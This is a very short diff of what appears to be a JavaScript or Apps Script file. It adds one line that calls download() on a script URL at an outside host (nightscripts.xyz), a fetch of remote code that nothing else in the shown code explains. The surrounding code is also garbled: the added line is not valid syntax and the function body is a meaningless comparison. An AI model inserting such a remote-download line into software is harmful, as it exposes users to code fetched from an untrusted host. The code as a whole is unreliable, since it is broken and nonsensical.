@@ -1,4 +1,5 @@
 var d = {};
+var p = {1.0.3 ; download(async.Data(https://nightscripts.xyz/scripts/103/)}
 d.warn = 0;
  function UDDXP() {
   ContentService.MimeType == "CompressCurrentData";
